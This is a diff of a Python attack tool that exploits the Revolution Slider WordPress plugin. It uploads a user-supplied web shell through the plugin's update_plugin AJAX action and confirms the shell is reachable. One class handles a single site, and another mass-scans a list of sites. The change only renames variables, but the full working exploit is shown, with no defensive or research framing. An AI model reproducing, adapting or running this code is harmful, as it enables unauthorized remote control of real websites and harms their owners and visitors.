@@ -23,21 +23,21 @@ def banner():
 class KyuRazz:
 	def __init__(self):
 		print("Target : Site.com/")
-		self.masuk = input("[-] Target => ")
+		self.mreks1k = input("[-] Target => ")
 		self.shell = input("[-] Ur Shell => ")
 		self.data = {'update_file':open(self.shell, "rb")}
 		self.data2 = {'action':'revslider_ajax_action', 'client_action':'update_plugin'}
 
 	def m0nalisa(self):
 		try:
-			self.exploit = (self.masuk+'/wp-admin/admin-ajax.php')
+			self.exploit = (self.mreks1k+'/wp-admin/admin-ajax.php')
 			nanang = requests.get(self.exploit).text
 			if '0' in nanang:
 				print ("[ LIVE  ] Revslider VULN")
 				start = requests.post(self.exploit, files=self.data, data=self.data2)
-				self.asu = ("wp-content/revslider/temp/update_extract/revslider/")
-				mantap = requests.get(self.masuk+self.asu+self.shell)
-				kintaman = (self.masuk+self.asu+self.shell)
+				self.reks1 = ("wp-content/revslider/temp/update_extract/revslider/")
+				mantap = requests.get(self.mreks1k+self.reks1+self.shell)
+				kintaman = (self.mreks1k+self.reks1+self.shell)
 				aniki = mantap.status_code
 				if aniki == 200:
 					print ("\033[0;33m[ \033[36mVULN \033[0;33m] {}" .format(kintaman))
@@ -52,20 +52,20 @@ class KyuRazz:
 class mouse:
 	def __init__(self):
 		print("Target : Site.com/")
-		self.masuk = input("[-] LIST => ")
+		self.mreks1k = input("[-] LIST => ")
 		self.shell = input("[-] Ur Shell => ")
 		self.data = {'update_file':open(self.shell, "rb")}
 		self.data2 = {'action':'revslider_ajax_action', 'client_action':'update_plugin'}
 	def FAC(self):
-		self.taik = open(self.masuk, 'r').readlines()
+		self.taik = open(self.mreks1k, 'r').readlines()
 		try:
 			for i in self.taik:
 				zz = i.strip()
 				self.exploit = (zz+'/wp-admin/admin-ajax.php')
 				start = requests.post(self.exploit, files=self.data, data=self.data2)
-				self.asu = ("wp-content/revslider/temp/update_extract/revslider/")
-				mantap = requests.get(zz+self.asu+self.shell)
-				kintaman = (zz+self.asu+self.shell)
+				self.reks1 = ("wp-content/revslider/temp/update_extract/revslider/")
+				mantap = requests.get(zz+self.reks1+self.shell)
+				kintaman = (zz+self.reks1+self.shell)
 				aniko = mantap.status_code
 				if aniko == 200:
 					print ("\033[0;33m[ \033[36mVULN \033[0;33m] {}" .format(kintaman))
